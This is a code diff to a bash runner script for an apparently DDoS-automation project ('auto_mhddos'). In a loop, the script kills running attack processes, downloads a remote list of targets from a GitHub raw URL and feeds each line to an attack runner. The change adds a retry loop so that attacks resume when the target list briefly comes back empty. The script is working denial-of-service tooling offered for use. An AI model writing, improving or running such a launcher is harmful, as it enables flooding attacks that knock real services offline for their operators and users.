@@ -20,9 +20,15 @@ debug="--debug"
 while true
 do
    pkill -f start.py; pkill -f runner.py 
-   # Get number of targets.
+   # Get number of targets. Sometimes (network or github problem) list_size = 0. So here is check.
    list_size=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]" | wc -l)
    echo -e "\nNumber of targets in list: " $list_size "\n"
+   while [[ $list_size = "0"  ]]
+      do
+            sleep 5
+            list_size=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]" | wc -l)
+            echo -e "\nNumber of targets in list: " $list_size "\n"
+      done
    for (( i=1; i<=list_size; i++ ))
       do
             cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets  | cat | grep "^[^#]")")
